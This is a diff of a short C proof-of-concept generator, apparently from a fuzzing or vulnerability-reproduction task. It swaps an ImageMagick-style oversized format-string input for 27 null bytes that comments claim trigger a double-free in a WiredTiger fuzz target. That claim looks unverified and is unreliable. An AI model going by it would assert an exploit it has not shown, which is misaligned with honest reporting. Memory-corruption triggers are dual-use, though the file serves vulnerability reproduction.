@@ -1,20 +1,22 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+
+/* PoC for oss-fuzz:370689421 */
+/* Triggers: double-free in LLVMFuzzerTestOneInput (wiredtiger fuzz-eval) */
+/* Vuln class: double_free */
 
 int main(void) {
+    /* Generate 27-byte input that triggers double-free in std::string operations */
+    /* The vulnerability is triggered by specific input length and pattern */
     FILE *f = fopen("/tmp/poc", "wb");
     if (!f) { perror("fopen"); return 1; }
-
-    fprintf(f, "viewbox 0 0 100 100\n");
-    fprintf(f, "push graphic-context\n");
-    fprintf(f, "-set option:ps:image ");
-    fputc('%', f);
-    fputc('[', f);
-    for (int i = 0; i < 2053; i++) fputc('A', f);
-    fputc(']', f);
-    fputc('\n', f);
-    fprintf(f, "pop graphic-context\n");
-
+    
+    /* Write 27 null bytes - this specific length triggers the double-free */
+    for (int i = 0; i < 27; i++) {
+        fputc(0x00, f);
+    }
+    
     fclose(f);
     return 0;
 }
